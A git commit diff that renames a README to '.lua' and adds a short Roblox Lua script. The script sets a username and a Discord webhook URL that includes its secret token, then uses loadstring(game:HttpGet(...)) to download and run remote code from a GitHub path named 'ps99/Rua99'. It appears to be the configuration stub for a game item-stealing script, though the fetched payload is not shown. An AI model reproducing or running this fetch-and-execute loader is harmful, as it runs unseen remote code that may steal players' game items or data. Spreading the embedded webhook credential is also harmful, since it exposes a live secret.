f4da10a384f09ff9fffb085cded6a19bb7e27000
ngquocviet <159024982+ngquocviet@users.noreply.github.com>
2025-03-29 21:14:26 +0700

    Update and rename README.md to .lua

---
+++ .lua
@@ -0,0 +1,4 @@
+Username = "vietpet99_01" 
+Webhook = "https://discord.com/api/webhooks/1332663453067902976/KyXVGtx4oHUZ-iC4hLcbUYq7Re9MLiIfN1ybliKnTzhqJGsif71SJ-gpISu1tfM_hwsC" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
